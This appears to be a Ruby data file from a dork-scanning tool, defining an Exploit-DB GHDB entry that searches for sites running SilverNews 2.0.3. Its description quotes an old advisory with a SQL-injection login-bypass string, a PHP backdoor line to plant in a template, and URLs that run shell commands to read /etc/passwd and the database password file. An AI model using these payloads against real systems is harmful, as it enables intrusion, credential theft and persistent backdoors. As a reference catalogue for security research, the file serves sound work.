module Dorks
   class Dork1052 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1052",
            ghdb_url: "https://www.exploit-db.com/ghdb/1052",
            severity: "3",
            category: "vulnerable_files",
            publish_date: "2005-08-07",
            author: "anonymous",
            dork: <<~EDORK,
"Powered by SilverNews"
EDORK
            description: <<~EDESC
silvernews 2.0.3 (possibly previous versions ) SQL Injection / Login Bypass / Remote commands execution / cross site scripting software: author site: http://www.silver-scripts.de/scripts.php?l=en&script=SilverNews SQL Injection / Login bypass: A user can bypass admin password check, if magic_quotes is set to off: user: ' or isnull(1/0) /* pass: whatever remote commands execution: now, new admin can edit template, clicking on Templates -> Global footer, can add the lines: //*********************************************** TEMPLATE; } } system($HTTP_GET_VARS[command]); /* to leave a backdoor in template file /templates/tpl_global.php now can launch system commands on the target system with theese urls: http://[target]/[path]//templates/tpl_global.php?command=ls%20-la to list directories http://[target]/[path]/templates/TPL_GLOBAL.PHP?command=cat%20/etc/passwd to see /etc/passwd file http://[target]/[path]/templates/TPL_GLOBAL.PHP?command=cat%20/[path_to_config_file]/data.inc.php to see Mysql database password cross site scripting: same way, a user can hide evil javascript code in template
EDESC
         })

      end
   end
end
